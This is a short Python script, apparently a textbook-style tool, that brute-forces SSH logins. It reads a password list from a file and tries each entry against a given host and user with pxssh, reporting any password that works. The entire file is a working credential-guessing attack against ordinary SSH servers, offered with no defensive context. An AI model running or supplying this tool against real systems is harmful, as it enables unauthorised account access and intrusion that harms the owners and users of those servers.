import pxssh
import optparse

def connect(host,user,password):

    print('[-] Testing: ' + password)

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[*] Password Found: '+password)
    except:
        print('[-] Error Connecting')

def main():

    parser = optparse.OptionParser('usage %prog -H <host> -u <user> -F <passfile>')
    parser.add_option('-H',dest='tgtHost',type='string',help='specify target host')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    parser.add_option('-F',dest='passwdFile',type='string',help='passwod file')
    (options,args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    fn = open(passwdFile,'r')
    for line in fn.readlines():
        password = line.strip('\r').strip('\n')
        connect(host,user,password)


if __name__ == '__main__':
    main()
